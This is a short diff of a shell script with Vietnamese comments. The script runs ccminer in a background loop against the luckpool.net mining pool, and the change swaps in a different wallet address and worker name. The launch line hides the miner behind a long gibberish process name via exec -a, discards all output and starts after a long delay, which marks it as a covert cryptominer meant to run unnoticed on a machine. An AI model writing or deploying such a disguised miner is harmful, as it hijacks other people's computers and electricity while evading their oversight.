@@ -4,7 +4,7 @@ sleep 800
 
 while true; do
     # Chạy lệnh với tên tiến trình đã thay đổi
-    bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RVvQgyuoCCRiQV7BBTDNNMAUH3WYp8HC9K.saverNode0002 -t 1 > /dev/null 2>&1" &
+    bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG09 -t 1 > /dev/null 2>&1" &
     
     # Lưu PID của tiến trình
     PID=$!  # Lưu PID ngay sau khi chạy
